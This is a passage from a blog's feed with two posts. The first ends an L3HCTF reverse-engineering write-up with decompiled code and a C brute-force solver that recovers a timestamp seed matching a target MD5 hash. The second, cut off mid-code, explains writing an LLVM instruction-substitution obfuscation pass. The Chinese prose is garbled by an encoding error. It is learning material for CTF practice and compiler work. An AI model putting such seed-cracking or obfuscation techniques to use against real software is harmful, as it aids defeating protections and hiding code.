random();</span></span><br><span class="line"><span class="params">  <span class="built_in">std</span>::basic_stringstream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_stringstream(Time, a2, v13, v49);</span></span><br><span class="line"><span class="params">  v14 = (<span class="type">double</span>)dword_14000B0E0;</span></span><br><span class="line"><span class="params">  v15 = (<span class="type">double</span>)(<span class="type">int</span>)(v58 | v56);</span></span><br><span class="line"><span class="params">  v18 = v14 * sub_1400033A0(v15, <span class="number">2.0</span>, v15, a10, v16, v17, (<span class="type">double</span>)dword_14000B0E0);</span></span><br><span class="line"><span class="params">  v19 = (<span class="type">double</span>)dword_14000B0E4;</span></span><br><span class="line"><span class="params">  <span class="keyword">if</span> ( v18 == sub_1400033A0((<span class="type">double</span>)(<span class="type">int</span>)(v57 | v55), <span class="number">2.0</span>, v15, (<span class="type">double</span>)(<span class="type">int</span>)(v57 | v55), v20, v21, v18) * v19 )</span></span><br><span class="line"><span class="params">  &#123;</span></span><br><span class="line"><span class="params">    p__ZSt4cout = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;salt=&quot;</span>, v50);</span></span><br><span class="line"><span class="params">    v23 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(Time, a2, v51, p__ZSt4cout);</span></span><br><span class="line"><span class="params">    v24 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;t=&quot;</span>, v23);</span></span><br><span class="line"><span class="params">    v25 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v53, v24);</span></span><br><span class="line"><span class="params">    v26 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;r=&quot;</span>, v25);</span></span><br><span class="line"><span class="params">    v27 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v52, v26);</span></span><br><span class="line"><span class="params">    v28 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;cipher=&quot;</span>, v27);</span></span><br><span class="line"><span class="params">    v31 = sub_14000184D((_DWORD)Time, a2, v53, v52, v29, v30, v48);</span></span><br><span class="line"><span class="params">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v31, v28);</span></span><br><span class="line"><span class="params">  &#125;</span></span><br><span class="line"><span class="params">  <span class="keyword">else</span></span></span><br><span class="line"><span class="params">  &#123;</span></span><br><span class="line"><span class="params">    p__ZSt4cout_1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;salt=&quot;</span>, v50);</span></span><br><span class="line"><span class="params">    v33 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(Time, a2, v51, p__ZSt4cout_1);</span></span><br><span class="line"><span class="params">    v34 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;t=&quot;</span>, v33);</span></span><br><span class="line"><span class="params">    v35 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v53, v34);</span></span><br><span class="line"><span class="params">    v36 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;r=&quot;</span>, v35);</span></span><br><span class="line"><span class="params">    v37 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v52, v36);</span></span><br><span class="line"><span class="params">    v38 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;a=&quot;</span>, v37);</span></span><br><span class="line"><span class="params">    v39 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v58, v38);</span></span><br><span class="line"><span class="params">    v40 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;b=&quot;</span>, v39);</span></span><br><span class="line"><span class="params">    v41 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v57, v40);</span></span><br><span class="line"><span class="params">    v42 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;x=&quot;</span>, v41);</span></span><br><span class="line"><span class="params">    v43 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v56, v42);</span></span><br><span class="line"><span class="params">    v44 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;&amp;y=&quot;</span>, v43);</span></span><br><span class="line"><span class="params">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, v55, v44);</span></span><br><span class="line"><span class="params">  &#125;</span></span><br><span class="line"><span class="params">  <span class="built_in">std</span>::basic_stringstream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::str(Time, a2, v49, a4);</span></span><br><span class="line"><span class="params">  <span class="built_in">std</span>::basic_stringstream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::~basic_stringstream(Time, a2, v45, v49);</span></span><br><span class="line"><span class="params">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(Time, a2, v46, v51);</span></span><br><span class="line"><span class="params">  <span class="keyword">return</span> a4;</span></span><br><span class="line"><span class="params">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰çš„random"><a href="#è‡ªå®šä¹‰çš„random" class="headerlink" title="è‡ªå®šä¹‰çš„random"></a>è‡ªå®šä¹‰çš„random</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">random</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = (((dword_14000B040 &lt;&lt; <span class="number">13</span>) ^ (<span class="type">unsigned</span> <span class="type">int</span>)dword_14000B040) &gt;&gt; <span class="number">17</span>) ^ (dword_14000B040 &lt;&lt; <span class="number">13</span>) ^ dword_14000B040;</span><br><span class="line">  dword_14000B040 = (<span class="number">32</span> * v1) ^ v1;</span><br><span class="line">  <span class="keyword">return</span> dword_14000B040 &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒæ˜¯æŠŠå½“å‰ç³»ç»Ÿçš„æ—¶é—´æˆ³åšéšæœºæ•°çš„ç§å­ï¼Œé¦–å…ˆè¦åœ¨å®ƒçº¦æŸçš„èŒƒå›´å†…æ‰èƒ½è¿è¡Œï¼Œç„¶åç”Ÿæˆäº†5ä¸ªrandomå€¼æ‹¼åˆæˆä¸€ä¸ªå­—ç¬¦ä¸²</p><p><code>salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=%u&amp;r=%d&amp;a=%d&amp;b=%d&amp;x=%d&amp;y=%d</code></p><p>å†åšmd5ï¼ˆæ ‡å‡†ï¼‰ä¸ç›®æ ‡å€¼<code>8a2fc1e9e2830c37f8a7f51572a640aa</code> æ¯”è¾ƒ</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEFTROTATE(x, c) (((x) <span class="string">&lt;&lt; (c)) | ((x) &gt;</span>&gt; (32 - (c))))</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> seed ;</span><br><span class="line"><span class="comment">// unsigned int first = 1751990400;</span></span><br><span class="line"><span class="comment">// unsigned int end =  1752052051;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// v1 = (((dword_7FF75004B040 &lt;&lt; 13) ^ (unsigned int)dword_7FF75004B040) &gt;&gt; 17) ^ (dword_7FF75004B040 &lt;&lt; 13) ^ dword_7FF75004B040;</span></span><br><span class="line"><span class="comment">// dword_7FF75004B040 = (32 * v1) ^ v1;</span></span><br><span class="line"><span class="comment">// return dword_7FF75004B040 &amp; 0x7FFFFFFF;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">random</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x = (seed &lt;&lt; <span class="number">13</span>) ^seed;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> y = (x &gt;&gt; <span class="number">17</span>) ^ x;</span><br><span class="line">    seed =(y * <span class="number">32</span>)^y;</span><br><span class="line">    <span class="keyword">return</span> seed &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">md5hexToString</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *md, <span class="type">char</span> *result)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(result + i * <span class="number">2</span>, <span class="string">&quot;%02x&quot;</span>, md[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  result[<span class="number">32</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1751990400</span>; i &lt; <span class="number">1752052051</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> query[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">    <span class="type">int</span> v58 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v57 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v56 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v55 = <span class="number">0</span>;</span><br><span class="line">    seed = i;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (<span class="type">int</span>)random(); ++k )</span><br><span class="line">    &#123;</span><br><span class="line">        v58 = random();</span><br><span class="line">        v57 = random();</span><br><span class="line">        v56 = random();</span><br><span class="line">        v55 = random();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> v52 = random();</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">snprintf</span>(query, <span class="keyword">sizeof</span>(query),</span><br><span class="line">  <span class="string">&quot;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=%u&amp;r=%d&amp;a=%d&amp;b=%d&amp;x=%d&amp;y=%d&quot;</span>,</span><br><span class="line">  i, v52, v58, v57, v56, v55);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, query);</span><br><span class="line"></span><br><span class="line">  MD5((<span class="type">unsigned</span> <span class="type">char</span> *)query, <span class="built_in">strlen</span>(query), digest);</span><br><span class="line"></span><br><span class="line">  md5hexToString(digest, flag);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(flag, <span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; Found at time: %d\n&quot;</span>, seed);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=1751994277&amp;r=101356418&amp;a=1388848462&amp;b=441975230&amp;x=1469980073&amp;y=290308156</span></span><br><span class="line"><span class="comment">// 8a2fc1e9e2830c37f8a7f51572a640aa</span></span><br><span class="line"><span class="comment">//  Found at time: 101356418</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// L3HCTF&#123;5cbbe37231ca99bd009f7eb67f49a98caae2bb0f&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm&amp;ollvmåˆæ¢</title>
      <link href="/2025/07/11/llvm/"/>
      <url>/2025/07/11/llvm/</url>
      
        <content type="html"><![CDATA[<h1 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h1><p>LLVMçš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†ç¼–è¯‘å™¨åˆ†ä¸ºå‰ç«¯å’Œåç«¯ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå‰ç«¯è´Ÿè´£å°†æºä»£ç è½¬æ¢ä¸ºä¸­é—´è¡¨ç¤ºLLVM Intermediate Representation ï¼ˆIRï¼‰ï¼ˆä»¥åº“çš„å½¢å¼æä¾›æ¥å£ï¼‰ï¼Œåç«¯è´Ÿè´£å°†ä¸­é—´è¡¨ç¤ºè½¬æ¢ä¸ºç›®æ ‡æœºå™¨çš„æ±‡ç¼–ä»£ç ã€‚<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111616684.png" alt=""></p><h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p>ä¸‰ç§è¡¨ç¤ºï¼š</p><ul><li>.ll æ ¼å¼ï¼šäººç±»å¯ä»¥é˜…è¯»çš„æ–‡æœ¬ã€‚</li><li>.bc æ ¼å¼ï¼šé€‚åˆæœºå™¨å­˜å‚¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li><li>å†…å­˜è¡¨ç¤º</li></ul><h2 id="LLVM-Pass"><a href="#LLVM-Pass" class="headerlink" title="LLVM Pass"></a>LLVM Pass</h2><blockquote><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class">https://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class</a></p></blockquote><p>Passå°±æ˜¯â€œéå†ä¸€éIRï¼Œå¯ä»¥åŒæ—¶å¯¹å®ƒåšä¸€äº›æ“ä½œâ€çš„æ„æ€ï¼ŒPass æ˜¯ ä¸­é—´ IR å¤„ç†ç¯èŠ‚çš„ä¸»è¦æ¨¡å—ã€‚<br>llvm passçš„ä½œç”¨ï¼š</p><ul><li>æ’æ¡©</li><li>ä¼˜åŒ–æœºå™¨æ— å…³çš„ä»£ç </li></ul><h3 id="ModulePass-åŸºäºæ¨¡å—"><a href="#ModulePass-åŸºäºæ¨¡å—" class="headerlink" title="ModulePass (åŸºäºæ¨¡å—)"></a>ModulePass (åŸºäºæ¨¡å—)</h3><p>å¦‚æœå‡½æ•°ä¼ é€’ä¸éœ€è¦ä»»ä½•æ¨¡å—æˆ–ä¸å¯å˜ä¼ é€’ï¼Œåˆ™æ¨¡å—ä¼ é€’å¯ä»¥ä½¿ç”¨æ¥å£çš„å‡½æ•°çº§ä¼ é€’ï¼ˆä¾‹å¦‚æ”¯é…è€…ï¼‰æ¥æä¾›æ£€ç´¢åˆ†æç»“æœçš„å‡½æ•°ã€‚</p><h3 id="FunctionPass-åŸºäºå‡½æ•°"><a href="#FunctionPass-åŸºäºå‡½æ•°" class="headerlink" title="FunctionPass (åŸºäºå‡½æ•°)"></a>FunctionPass (åŸºäºå‡½æ•°)</h3><h3 id="CallGraphPass-åŸºäºè°ƒç”¨å›¾"><a href="#CallGraphPass-åŸºäºè°ƒç”¨å›¾" class="headerlink" title="CallGraphPass (åŸºäºè°ƒç”¨å›¾)"></a>CallGraphPass (åŸºäºè°ƒç”¨å›¾)</h3><h3 id="LoopPass-åŸºäºå¾ªç¯"><a href="#LoopPass-åŸºäºå¾ªç¯" class="headerlink" title="LoopPass (åŸºäºå¾ªç¯)"></a>LoopPass (åŸºäºå¾ªç¯)</h3><h3 id="PASS-æ³¨å†Œæ–¹å¼"><a href="#PASS-æ³¨å†Œæ–¹å¼" class="headerlink" title="PASS æ³¨å†Œæ–¹å¼"></a>PASS æ³¨å†Œæ–¹å¼</h3><p>1ã€ä¿®æ”¹ PassRegistry.def å’Œ PassBuilder.cpp æ–‡ä»¶ï¼Œç›´æ¥è¿½åŠ  Pass å®šä¹‰è¿›å»ã€‚<br>2ã€æ˜¯ç”¨æ’ä»¶æ¥å£è¿›è¡Œæ³¨å†Œ</p><h3 id="LLVM-Pass-å®ç°ã€ŒæŒ‡ä»¤æ›¿ä»£æ··æ·†ã€"><a href="#LLVM-Pass-å®ç°ã€ŒæŒ‡ä»¤æ›¿ä»£æ··æ·†ã€" class="headerlink" title="LLVM Pass å®ç°ã€ŒæŒ‡ä»¤æ›¿ä»£æ··æ·†ã€"></a>LLVM Pass å®ç°ã€ŒæŒ‡ä»¤æ›¿ä»£æ··æ·†ã€</h3><div class="table-container"><table><thead><tr><th>æ­¥éª¤</th><th>æ“ä½œ</th></tr></thead><tbody><tr><td>æ³¨å†Œ</td><td>é€šè¿‡ <code>llvmGetPassPluginInfo()</code> æ³¨å†Œ</td></tr><tr><td>éå†</td><td>éå† <code>Function</code> / <code>BasicBlock</code></td></tr><tr><td>ä¿®æ”¹</td><td>è¿›è¡Œ IR æ§åˆ¶æµæ”¹é€ ï¼ˆæ·»åŠ è·³è½¬ / switch / ä¼ªé€»è¾‘ï¼‰</td></tr></tbody></table></div><blockquote><p>å‚è€ƒï¼š<a href="https://3cly.github.io/2023/12/26/llvmpass%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2/">https://3cly.github.io/2023/12/26/llvmpass%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2/</a></p></blockquote><ol><li>Pass çš„æ³¨å†Œæ–¹å¼ï¼šæ’ä»¶å¼æ³¨å†Œï¼Œä½¿ç”¨ llvmGetPassPluginInfo() æä¾›æ’ä»¶ä¿¡æ¯ç»™ LLVMã€‚<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> LLVM_ATTRIBUTE_WEAK ::<span class="function">llvm::PassPluginLibraryInfo</span></span><br><span class="line"><span class="function"><span class="title">llvmGetPassPluginInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;LLVM_PLUGIN_API_VERSION, <span class="comment">//llvm ç‰ˆæœ¬å·ç¯å¢ƒå–å€¼</span></span><br><span class="line">          <span class="string">&quot;mba-sub&quot;</span>,              <span class="comment">//æ’ä»¶åå­—</span></span><br><span class="line">        LLVM_VERSION_STRING,  <span class="comment">//æ’ä»¶ç‰ˆæœ¬å· éƒ½æ˜¯éšä¾¿ä¼ </span></span><br><span class="line">          [](PassBuilder &amp;PB) &#123;   <span class="comment">// ç¬¬å››ä¸ªæ˜¯ä¸€ä¸ªå›è°ƒï¼Œ</span></span><br><span class="line">          <span class="comment">// ç”¨äºå‘Šè¯‰ PassBuilderï¼šå½“ç”¨æˆ·ä¼ äº† &quot;mba-sub&quot; æ—¶ï¼Œå°±æ³¨å†Œä½ è‡ªå·±çš„ MBASub Passã€‚</span></span><br><span class="line">            PB.<span class="built_in">registerPipelineParsingCallback</span>(   </span><br><span class="line">                [](StringRef Name, FunctionPassManager &amp;FPM,</span><br><span class="line">                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (Name == <span class="string">&quot;mba-sub&quot;</span>) &#123;</span><br><span class="line">                    FPM.<span class="built_in">addPass</span>(<span class="built_in">MBASub</span>());</span><br><span class="line">      <span class="comment">//FPM.addPass (MBASub ()) è¿™è¡Œä»£ç å‘å‡½æ•°çº§åˆ« Pass ç®¡ç†å™¨ FPM ä¸­æ·»åŠ äº†ä¸€ä¸ª MBASub Pass çš„å®ä¾‹ã€‚</span></span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œï¼ŒMBASub () è¡¨ç¤ºåˆ›å»ºäº† MBASub ç»“æ„ä½“çš„ä¸€ä¸ªå®ä¾‹ (é»˜è®¤æ„é€ å‡½æ•°)ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ° Pass ç®¡ç†å™¨ä¸­</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">          &#125;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt -load-pass-plugin ./libMBASub.so -passes=mba-sub &lt; input.ll &gt; output.ll</span><br></pre></td></tr></table></figure><ol><li><p>å®šä¹‰ Pass æœ¬ä½“ï¼ˆMBASubï¼‰<br>å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ <code>MBASub</code>ï¼Œç»§æ‰¿è‡ª<code>llvm::PassInfoMixin&lt;MBASub&gt;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MBASub</span> : <span class="keyword">public</span> llvm::PassInfoMixin&lt;MBASub&gt; &#123;</span><br><span class="line">  <span class="function">llvm::PreservedAnalyses <span class="title">run</span><span class="params">(llvm::Function &amp;F, llvm::FunctionAnalysisManager &amp;)</span></span>;</span><br><span class="line">  <span class="comment">//run() æ˜¯å…¥å£ï¼Œéå†å‡½æ•°ä¸­æ‰€æœ‰åŸºæœ¬å—</span></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">runOnBasicBlock</span><span class="params">(llvm::BasicBlock &amp;B)</span></span>;</span><br><span class="line">  <span class="comment">//runOnBasicBlock() å®é™…å¤„ç†æ¯ä¸ªåŸºæœ¬å—ä¸­çš„æŒ‡ä»¤ï¼›</span></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">isRequired</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">  <span class="comment">//isRequired() è¿”å› true è¡¨ç¤ºè¿™ä¸ª Pass é»˜è®¤å¯ç”¨ï¼ˆä¸æ˜¯åˆ†æ Passï¼‰ã€‚</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>æŒ‡ä»¤æ›¿æ¢æ ¸å¿ƒé€»è¾‘ï¼šå°† a - b æ›¿æ¢ä¸º (a + ~b) + 1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MBASub::runOnBasicBlock</span><span class="params">(BasicBlock &amp;BB)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> Inst = BB.<span class="built_in">begin</span>(); Inst != BB.<span class="built_in">end</span>(); ++Inst) &#123;</span><br><span class="line">    <span class="keyword">auto</span> *BinOp = <span class="built_in">dyn_cast</span>&lt;BinaryOperator&gt;(Inst);</span><br><span class="line">    <span class="comment">//dyn_cast&lt;BinaryOperator&gt;ï¼šä»é€šç”¨ Instruction ç±»å‹åŠ¨æ€è½¬ä¸ºäºŒå…ƒæ“ä½œç±»å‹ï¼›</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!BinOp) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> Opcode = BinOp-&gt;<span class="built_in">getOpcode</span>();   <span class="comment">//getOpcode() åˆ¤æ–­æ˜¯ä¸æ˜¯ sub æŒ‡ä»¤ï¼›</span></span><br><span class="line">    <span class="keyword">if</span> (Opcode != Instruction::Sub || !BinOp-&gt;<span class="built_in">getType</span>()-&gt;<span class="built_in">isIntegerTy</span>())</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    IRBuilder&lt;&gt; <span class="built_in">Builder</span>(BinOp);         <span class="comment">//IRBuilder&lt;&gt; ç”¨äºæ„é€  IR æ–°æŒ‡ä»¤ï¼›</span></span><br><span class="line">    Instruction *NewValue = BinaryOperator::<span class="built_in">CreateAdd</span>(</span><br><span class="line">        Builder.<span class="built_in">CreateAdd</span>(BinOp-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>),</span><br><span class="line">                          Builder.<span class="built_in">CreateNot</span>(BinOp-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>))),</span><br><span class="line">        ConstantInt::<span class="built_in">get</span>(BinOp-&gt;<span class="built_in">getType</span>(), <span 